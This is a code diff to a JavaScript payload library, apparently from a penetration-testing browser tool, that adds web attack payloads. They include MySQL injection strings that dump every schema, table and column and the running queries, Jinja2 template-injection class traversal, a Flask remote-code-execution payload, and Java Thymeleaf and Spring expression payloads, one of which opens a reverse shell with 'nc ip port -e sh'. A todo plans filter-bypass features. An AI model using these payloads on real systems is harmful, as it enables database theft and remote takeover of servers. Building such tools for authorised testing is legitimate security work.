@@ -61,6 +61,7 @@ window.Payload.SQLi = {
         ' from information_schema.columns where table_schema=database()'
     },
 
+    // PayloadsAllTheThings https://github.com/swisskyrepo/PayloadsAllTheThings/
     dumpInOneShot: value => "(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)",
 
     dumpCurrentQueries: value => "(select(@)from(select(@:=0x00),(select(@)from(information_schema.processlist)where(@)in(@:=concat(@,0x3C62723E,state,0x3a,info))))a)",
@@ -180,8 +181,18 @@ window.Payload.LFI = {
 }
 
 window.Payload.SSTI = {
-  flaskRCE: value => {
+  Jinja2:{
+    tuple2Class: value => "{{().__class__.__base__.__subclasses__()}}",
+    string2Class: value => "{{''.__class__.mro()[1].__subclasses__()}}",
+    list2Class: value => "{{[].__class__.__base__.__subclasses__()}}",
+    method2Global: value => "{{foo.__init__.__globals__}}",
+    flaskRCE: value => 
     // Reference: https://twitter.com/realgam3/status/1184747565415358469
-    return "{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}"
+    "{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}"
+    // todo : add features to bypass filter keywords like __ '' "" []
+  },
+  Java:{
+    thymeleafRCE: value => '__${T(java.lang.Runtime).getRuntime().exec("nc ip port -e sh")}__::.x',
+    commonRCE:value => "${T(java.lang.Runtime).getRuntime().exec('ls')}"
   }
 }
